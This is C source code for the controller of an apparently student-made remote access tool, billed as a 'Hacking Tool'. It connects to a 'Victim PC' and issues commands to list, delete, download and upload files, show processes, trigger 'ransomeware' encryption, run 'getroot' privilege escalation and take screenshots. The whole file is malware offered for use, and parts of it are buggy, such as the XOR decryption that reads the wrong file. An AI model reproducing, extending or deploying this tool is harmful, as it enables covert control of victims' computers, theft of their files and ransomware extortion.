#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>

#define BUFSIZE 2048
#define PORT 9999

void error_handling(char *message);
void print_menu();
void help_command();

int main(int argc, char **argv) {

    int sock;
    int size;
    int status;
    int filehandle;

    char menu[BUFSIZE];
    char filename[BUFSIZE];
    char buf[BUFSIZE];
    char temp[20];
    char *f;
    char dec_file[BUFSIZE];

    struct stat obj;
    struct sockaddr_in serv_addr;

    FILE *fp;
    FILE *fd;

    if (argc != 2) {
        printf("Usage : %s <IP>\n", argv[0]);
        exit(1);
    }

    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock == -1)
        error_handling("socket() error");

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(argv[1]);
    serv_addr.sin_port = htons(PORT);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
        error_handling("connect() error");
    }

    system("clear");
    print_menu();
    while (1) {
        // command line
        printf("\033[1;32mCommand line > ");
        fgets(menu, BUFSIZE, stdin);
        fprintf(stderr, "\033[97m");

        if (!strcmp(menu, "help\n")) { // 1. help
            help_command();
        }

        else if (!strcmp(menu, "cd\n")) { // 2. cd
            strcpy(buf, "cd ");
            printf("\033[1;32mcd >> ");
            scanf("%s", buf + 3);
            fgets(temp, BUFSIZE, stdin);
            send(sock, buf, 100, 0);
            recv(sock, &status, sizeof(int), 0);
            if (status)
                printf("\033[1;31mChange complete!!\n");
            else {
                printf("\033[1;31mChange fail..\n");
            }
        }

        else if (!strcmp(menu, "ls\n")) { // 3. ls
            strcpy(buf, "ls");
            send(sock, buf, 100, 0);
            recv(sock, &size, sizeof(int), 0);
            f = malloc(size);
            recv(sock, f, size, 0);
            filehandle = creat("temp_ls.txt", 0777);
            write(filehandle, f, size, 0);
            close(filehandle);
            printf("\033[1;36mVictim PC's file list -----\033[1;0m\n");
            system("cat temp_ls.txt");
            system("rm temp_ls.txt");
        }

        else if (!strcmp(menu, "pwd\n")) { // 4.pwd
            strcpy(buf, "pwd");
            send(sock, buf, 100, 0);
            recv(sock, &size, sizeof(int), 0);
            f = malloc(size);
            recv(sock, f, size, 0);
            filehandle = creat("temp_pwd.txt", 0777);
            write(filehandle, f, size, 0);
            close(filehandle);
            printf("\033[1;36mVictim PC's PWD\033[1;0m\n");
            system("cat temp_pwd.txt");
            system("rm temp_pwd.txt");
        }

        else if (!strcmp(menu, "rm\n")) { // 5. rm
            printf("\033[1;32minput rm file name >> ");
            scanf("%s", filename);
            fgets(temp, BUFSIZE, stdin);
            strcpy(buf, "rm ");
            strcat(buf, filename);
            send(sock, buf, 100, 0);
            printf("\033[1;31mremove complete!\n");
        }

        else if (!strcmp(menu, "ps\n")) { // 6. ps
            strcpy(buf, "ps");
            send(sock, buf, 100, 0);
            recv(sock, &size, sizeof(int), 0);
            f = malloc(size);
            recv(sock, f, size, 0);
            filehandle = creat("temp_ps.txt", 0777);
            write(filehandle, f, size, 0);
            close(filehandle);
            printf(
                "\033[1;36mVictim PC's process list save txt file\n\033[1;0m");
        }

        else if (!strcmp(menu, "getinfo\n")) { // 7.getinfo
            printf("\033[1;32minput file name >> ");
            scanf("%s", filename);
            fgets(temp, BUFSIZE, stdin);
            strcpy(buf, "getinfo ");
            strcat(buf, filename);
            send(sock, buf, 100, 0);

            recv(sock, &size, sizeof(int), 0);
            if (!size) {
                printf("\033[1;31mThe file does not exist!!\n");
                continue;
            }
            recv(sock, &size, sizeof(int), 0);
            f = malloc(size);
            recv(sock, f, size, 0);
            while (1) {
                filehandle =
                    open("file_info.txt", O_CREAT | O_APPEND | O_WRONLY, 0777);
                if (filehandle == -1) {
                    sprintf(filename + strlen(filename), "_1");
                } else {
                    break;
                }
            }
            write(filehandle, f, size, 0);
            close(filehandle);
            printf("\033[1;31mSave file info -> file_info.txt \n");
        }

        else if (!strcmp(menu, "download\n")) { // 8.download
            printf("\033[1;32minput download file name >> ");
            scanf("%s", filename);
            fgets(temp, BUFSIZE, stdin);
            strcpy(buf, "download ");
            strcat(buf, filename);
            send(sock, buf, 100, 0);
            recv(sock, &size, sizeof(int), 0);
            if (!size) {
                printf("\033[1;31mThe file does not exist!!\n");
                continue;
            }
            while (1) {
                filehandle = open(filename, O_CREAT | O_EXCL | O_WRONLY, 0777);
                if (filehandle == -1) {
                    sprintf(filename + strlen(filename), "_1");
                } else {
                    break;
                }
            }
            f = malloc(size);
            recv(sock, f, size, 0);
            write(filehandle, f, size);
            close(filehandle);
            printf("\033[1;31minput download complete!\n");
        }

        else if (!strcmp(menu, "upload\n")) { // 9.upload
            printf("\033[1;32mupload file name >> ");
            scanf("%s", filename);
            fgets(temp, BUFSIZE, stdin);
            filehandle = open(filename, O_RDONLY);
            if (filehandle == -1) {
                printf("\033[1;31mThe file does not exist!!\n");
                continue;
            }
            strcpy(buf, "upload ");
            strcat(buf, filename);
            send(sock, buf, 100, 0);
            stat(filename, &obj);
            size = obj.st_size;
            send(sock, &size, sizeof(int), 0);
            sendfile(sock, filehandle, NULL, size);
            recv(sock, &status, sizeof(int), 0);
            if (status)
                printf("\033[1;31mupload complete!\n");
            else
                printf("\033[1;31mupload fail..\n");
        }

        else if (!strcmp(menu, "id\n")) { // 10.id
            strcpy(buf, "id");
            send(sock, buf, 100, 0);
            recv(sock, &size, sizeof(int), 0);
            f = malloc(size);
            recv(sock, f, size, 0);
            filehandle = creat("temp_id.txt", 0644);
            write(filehandle, f, size, 0);
            close(filehandle);
            printf("\033[1;36mVictim PC's ID\033[1;0m\n");
            system("cat temp_id.txt");
            system("rm temp_id.txt");
        }

        else if (!strcmp(menu, "clear\n")) { // 11.clear
            system("clear");
            print_menu();
        }

        else if (!strcmp(menu, "quit\n")) { // 12. quit
            strcpy(buf, "quit");
            send(sock, buf, 100, 0);
            recv(sock, &status, 100, 0);
            if (status) {
                printf("\033[1;31mServer close complete\n");
                exit(0);
            }
            printf("\033[1;31mclose fail\n");
        }

        else if (!strcmp(menu, "ransomeware\n")) { // 13.ransomeware
            strcpy(buf, "ransomeware");
            send(sock, buf, 100, 0);
            printf("\033[1;31mFile Encryption complete!\n");
        }

        else if (!strcmp(menu, "decryption\n")) { // 14.decryption
            printf("\033[1;32mInput Decryption file name : ");
            scanf("%s", dec_file);
            fgets(temp, BUFSIZE, stdin);
            int ch;
            fp = fopen(filename, "r+b");
            for (int i = 0; i < 4; i++) {
                filename[strlen(filename) - 1] = '\0';
            }
            char *s1 = malloc(sizeof(char) * BUFSIZE);
            strcpy(s1, "dec_");
            strcat(s1, filename);
            fd = fopen(s1, "w+b");
            while ((ch = fgetc(fp)) != EOF) {
                int original = ch;
                int decrypt = 0;
                int key = 0x394A38C9;
                decrypt = original ^ key;
                ch = decrypt;
                fputc(ch, fd);
            }
            fclose(fd);
            fclose(fp);
            free(s1);
        }

        else if (!strcmp(menu, "getroot\n")) { // 15.getroot
            strcpy(buf, "getroot");
            send(sock, buf, 100, 0);
            recv(sock, buf, 100, 0);
            printf("%s\n", buf);
        }

        else if (!strcmp(menu, "screenshot\n")) { // 16.screenshot
            strcpy(buf, "screenshot");
            send(sock, buf, 100, 0);
        }
    }

    close(sock);
    return 0;
}

void error_handling(char *message) {
    fputs(message, stderr);
    fputc('\n', stderr);
    exit(1);
}

void print_menu() {
    printf("\033[1;0m  _    _            _    _               _______          "
           "_\n");
    printf("\033[1;0m | |  | |          | |  (_)             |__   __|        "
           "| |\n");
    printf("\033[1;0m | |__| | __ _  ___| | ___ _ __   __ _     | | ___   ___ "
           "| |\n");
    printf("\033[1;0m |  __  |/ _` |/ __| |/ / | '_ \\ / _` |    | |/ _ \\ / _ "
           "\\| |\n");
    printf("\033[1;0m | |  | | (_| | (__|   <| | | | | (_| |    | | (_) | (_) "
           "| |\n");
    printf("\033[1;0m |_|  |_|\\__,_|\\___|_|\\_\\_|_| |_|\\__, |    |_|\\___/ "
           "\\___/|_|\n");
    printf("\033[1;0m                                  __/ |\n");
    printf("\033[1;0m        ,           ,            |___/\n");
    printf("\033[1;0m       /             \\\n");
    printf("\033[1;0m      ((__---,,,---__))\n");
    printf("\033[1;0m         (_) O O (_)_______________\n");
    printf("\033[1;0m            \\ _ /                 |\\\n");
    printf("\033[1;0m             o_o \\    Black Cow   | \\\n");
    printf("\033[1;0m                  \\   __________  |  *\n");
    printf("\033[1;0m                   |||          |||\n");
    printf("\033[1;0m                   |||          |||\n");
    printf("\033[1;0m                   |||          |||    Data Structure "
           "project\n");
    printf("\n");
    printf("\033[1;33m         [ Hacking Tool v4.11.8- \n");
    printf("\033[1;33m + -- --=[ 0016 commands - Use 9999 port - Socket        "
           "       ]\n");
    printf("\033[1;33m + -- --=[ Free Hacking Tool : "
           "github.com/Hmgi/datastructure    ]\n");
    printf("\033[1;33m + -- --=[ Show command -> help                          "
           "       ]\n\n");
}

void help_command() {
    printf("\n\033[1;36m Core Commands\n");
    printf("\033[1;36m =================\n");
    printf("\033[1;0m \n");
    printf("\033[1;0m \n");
    printf("\033[1;0m       Command             Description\n");
    printf("\033[1;0m       -------             ---------------------\n");
    printf("\033[1;0m       help                Help menu\n");
    printf("\033[1;0m       cd                  Change the current working "
           "directory\n");

    printf(
        "\033[1;0m       ls                  Show contents of a directory or "
        "directories\n");
    printf("\033[1;0m       pwd                 Prints the path of the working "
           "directory\n");
    printf("\033[1;0m       rm                  remove File\n");
    printf("\033[1;0m       ps                  Show Process list\n");
    printf("\033[1;0m       getinfo             Show user info of the file\n");
    printf("\033[1;0m       download            File download\n");
    printf("\033[1;0m       upload              File upload\n");
    printf("\033[1;0m       id                  Print User ID(UID) & Group "
           "ID(GID)\n");
    printf("\033[1;0m       clear               Clear display\n");
    printf("\033[1;0m       quit                Exit the console\n");
    printf("\033[1;0m       -------             ---------------------\n\n");
    printf("\033[1;0m       Cracking Command    Description\n");
    printf("\033[1;0m       ----------------    ---------------------\n");

    printf("\033[1;0m       ransomeware         Encryption file\n");
    printf("\033[1;0m       decryption          Decryption file\n");
    printf("\033[1;0m       getroot             GET SUPER USER\n");
    printf("\033[1;0m       screenshot          Get screenshot\n\n\n");
}
